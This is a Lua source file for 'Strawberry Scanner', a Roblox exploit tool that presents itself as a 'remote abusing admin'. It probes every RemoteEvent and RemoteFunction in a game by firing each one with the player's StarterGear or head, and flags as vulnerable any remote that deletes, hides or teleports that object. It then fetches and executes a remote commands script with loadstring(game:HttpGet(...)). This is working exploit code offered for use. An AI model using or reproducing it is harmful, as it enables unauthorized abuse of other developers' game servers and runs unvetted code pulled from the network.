--- START OF FILE Strawberry-Scanner-main/nightly/scanner.lua ---

--[========================================================================[
	      ⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⡄⠀⠀⠀⠀⢀⠀⠀
		⠀⠀⠀⠀⠀⠀⣏⠓⠒⠤⣰⠋⠹⡄⠀⣠⠞⣿⠀⠀
		⠀⠀⠀⢀⠄⠂⠙⢦⡀⠐⠨⣆⠁⣷⣮⠖⠋⠉⠁⠀
		⠀⠀⡰⠁⠀⠮⠇⠀⣩⠶⠒⠾⣿⡯⡋⠩⡓⢦⣀⡀
		⠀⡰⢰⡹⠀⠀⠲⣾⣁⣀⣤⠞⢧⡈⢊⢲⠶⠶⠛⠁
		⢀⠃⠀⠀⠀⣌⡅⠀⢀⡀⠀⠀⣈⠻⠦⣤⣿⡀⠀⠀
		⠸⣎⠇⠀⠀⡠⡄⠀⠷⠎⠀⠐⡶⠁⠀⠀⣟⡇⠀⠀
		⡇⠀⡠⣄⠀⠷⠃⠀⠀⡤⠄⠀⠀⣔⡰⠀⢩⠇⠀⠀
		⡇⠀⠻⠋⠀⢀⠤⠀⠈⠛⠁⠀⢀⠉⠁⣠⠏⠀⠀⠀
		⣷⢰⢢⠀⠀⠘⠚⠀⢰⣂⠆⠰⢥⡡⠞⠁⠀⠀⠀⠀
		⠸⣎⠋⢠⢢⠀⢠⢀⠀⠀⣠⠴⠋⠀⠀⠀⠀⠀⠀⠀
		⠀⠘⠷⣬⣅⣀⣬⡷⠖⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
		⠀⠀⠀⠀⠈⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	
	    StrawberryCMD, the best remote abusing admin in Roblox.
	    Copyright (C) 2025 C:\Drive and Saji
	
		Last updated: 10/6/2025
			[+] Better vuln checks, checking for invisible / non-collidable / far-teleported stuff
			[+] Cleaned up the code (saji i hate u)
			[+] Made it Slightly faster
			[+] Better filtering system
			[+] Added support for RemoteFunctions
			[+] Fixed bad grammar (I'M LOOKING AT YOU SAJI)
			
		Credits: 
			C:\Drive - Owner | Cleaned up the scanner
			Saji - Co-Founder | Created the core scanner
			Sane - Cleaner / Logic Fixer
			
		[!] PLEASE, IF YOU WANT TO CONTRIBUTE TO THIS SCRIPT
			SINCE THE CODE ISN'T THE BEST RIGHT NOW [!]
		
		Also sorry if the code looks like it's made from ChatGPT, I swear
		to god it's not. That's just how Saji codes and I'm just gonna
							     roll with it.
		
	--]========================================================================]
	
	--[[
		 __   ___   ___ ___   _   ___ _    ___ ___ 
		 \ \ / /_\ | _ \_ _| /_\ | _ ) |  | __/ __|
		  \ V / _ \|   /| | / _ \| _ \ |__| _|\__ \
		   \_/_/ \_\_|_\___/_/ \_\___/____|___|___/
	                  Boring stuff                               
	]]
	
	local ScanButton = script.Parent.ScanBtn --# Binded button to start scan
	local AlreadyScanned = false --# So they can't scan twice
	
	local MaxScanTime = 0.265 --# If the remote doesn't respond in this time it gets skipped
	
	--# Player related variables
	local Players = game:GetService("Players")
	local LocalPlayer = Players.LocalPlayer
	local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
	
	local CurrentVulnerableRemote = nil --# This is where the remote will be stored if found
	
	--[[
		  ___ _   _ _  _  ___ _____ ___ ___  _  _ ___ 
		 | __| | | | \| |/ __|_   _|_ _/ _ \| \| / __|
		 | _|| |_| | .` | (__  | |  | | (_) | .` \__ \
		 |_|  \___/|_|\_|\___| |_| |___\___/_|\_|___/
					  Less boring stuff
	]]
	
	local function isFucked(obj)
		if not obj or not obj.Parent or obj:IsDescendantOf(game) == false then 
			return true -- It's straight up deleted or parent is nil. Easy.
		end
        
		if obj.CanCollide == false and obj.Transparency >= 0.99 then
			return true -- It's a ghost part. Soft delete. Bad sign.
		end

		if obj:IsA("BasePart") and obj.Position.Magnitude > 100000000 then
			return true -- Teleported to the void. Classic.
		end
        
		return false
	end --# Check if the part is deleted, hidden, or teleported to hell
	
	local function isEligible(rmevent)
		if rmevent ~= nil and rmevent.Parent ~= nil and rmevent.Parent.Name == "RobloxReplicatedStorage" then
			return false
		end
		if rmevent ~= nil and rmevent.Parent ~= nil and rmevent.Parent.Name == "DefaultChatSystemChatEvents" then
			return false
		end
		if rmevent ~= nil and rmevent.Parent.Parent ~= nil and rmevent.Parent.Parent.Name == "HDAdminClient" and rmevent.Parent.Name == "Signals" then
			return false
		end
		if rmevent:FindFirstChild("__FUNCTION") or rmevent.Name == "__FUNCTION" then
			return false
		end
		--# All of the above filters out the remotes that aren't usefull at all, decreasing the amount of false positives and making scan times faster in general
		
		return true --# If none apply it's eligible
	end
	
	local function isVulnerable(rmevent)
		--# Stage 1: TestPart Allocation (for feeding it to remote events)
	
		--# Attempts to get startergear which is a useless object we can use for testing
		local TestPart = LocalPlayer:FindFirstChild("StarterGear")
		if not TestPart then
			warn("StrawScan // StarterGear not found, replacing with char head")
			TestPart = Character:FindFirstChild("Head")
		end --# If startergear is not found, it will try to test with the chars head
	
		if not TestPart then
			error("StrawScan // TestPart could not be found!")
			return false
		end --# If failed to find a testpart the script will just kill itself basically
	
		--# Stage 2: Firing the remote and seeing if its vulnerable
		
		if rmevent:IsA("RemoteEvent") then --# Check if it is a remote event
			rmevent:FireServer(TestPart)
		elseif rmevent:IsA("RemoteFunction") then --# YES, ADDED SUPPORT FOR REMOTE FUNCTIONS, FINALLY
			coroutine.wrap(function()
				local success, result = pcall(function()
					rmevent:InvokeServer(TestPart)
				end)
			end)()
		end
	
		local t = tick()
		while tick() - t < MaxScanTime do
			if isFucked(TestPart) then
				print("StrawScan // Vulnerable remote found!: " .. rmevent:GetFullName())
				CurrentVulnerableRemote = rmevent
				return true
			end
	
			task.wait()
		end --# Actively checking if the remote event has responded
	
		--# If you got to this point, the remote wasn't vulnerable so we are returning false
		print("StrawScan // Remote not vulnerable: " .. rmevent:GetFullName())
		return false
	end --# Fully scans a remote event to check if it has a vulnerability
	
	--[[
		  ___  ___   _   _  _ _  _ ___ _  _  ___ 
		 / __|/ __| /_\ | \| | \| |_ _| \| |/ __|
		 \__ \ (__ / _ \| .` | .` || || .` | (_ |
		 |___/\___/_/ \_\_|\_|_|\_|___|_|\_|\___|
			   This is there the fun begins
	]]
	
	ScanButton.MouseButton1Click:Connect(function()
		if AlreadyScanned then return end
		AlreadyScanned = true
	
		local Remotes = {}
		local FoundRemote = false
	
		--# Goes through every remote in the game and checks if it is eligible, if so it adds it into a table
		for _, v in pairs(game:GetDescendants()) do
			if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
				if isEligible(v) then
					FoundRemote = true
					table.insert(Remotes, v)
				end
			end
		end
	
		if not FoundRemote then
			ScanButton.TextSize = 12 --# Sizing the font size down for the following message
			ScanButton.Text = "There's no remote events. Mb." --# WHO EVER MADE A GAME LIKE THIS, I HATE YOU
			
			wait(5)
			script.Parent.Parent:Destroy() --# Destroying the UI if there's no remotes
			
			return
		end
	
		--# Counting the amount of remotes in the queue
		ScanButton.Text = "Scanning... (0/" .. tostring(#Remotes) .. ")"
	
		--# Scans and counts every remote inside the queue
		for i, v in pairs(Remotes) do
			ScanButton.Text = "Scanning... (" .. tostring(i) .. "/" .. tostring(#Remotes) .. ")"
	
			local vulnerable = isVulnerable(v)
			if vulnerable then
				task.delay(0, function()
					ScanButton.TextSize = 12 --# Sizing it down for the following message
					ScanButton.Text = "Vuln found, booting up" --# Telling the pookie user that a vuln remote is found :happyface:
	
					local VulnRemote = Instance.new("ObjectValue") --# Creates a pointer for the vulnerable remote so the commands script can access the remote
					VulnRemote.Parent = LocalPlayer.PlayerGui
					VulnRemote.Name = "StrawberryHookedRM"
					VulnRemote.Value = CurrentVulnerableRemote
	
					loadstring(game:HttpGet("https://raw.githubusercontent.com/StrawberryRBLX/Strawberry-Scanner/refs/heads/main/release/commands.lua"))() --# Loads up the commands script
					task.wait(0.1) --# Waits before removing the scanner UI
					script.Parent.Parent:Destroy() --# Removes the scanner UI
				end)
	
				break
			end
		end
	
		if CurrentVulnerableRemote ~= nil and (CurrentVulnerableRemote:IsA("RemoteEvent") or CurrentVulnerableRemote:IsA("RemoteFunction")) then
			return
		end
	
		ScanButton.TextSize = 12 --# Sizing it down for the following message
		ScanButton.Text = "Sorry, no vuln remotes" -- Telling the pookie user that no remote is vulnurable :sadface:
		
		wait(5)
		
		script.Parent.Parent:Destroy() --# Destroying the UI if there's no vulnurable remotes
		
		return
	end) -- // CRAP LOGIC THAT HANDLES THE SCANNNINGGGGG
	
end;
task.spawn(C_16);

return STRW["1"], require;
--- END OF FILE Strawberry-Scanner-main/nightly/scanner.lua ---
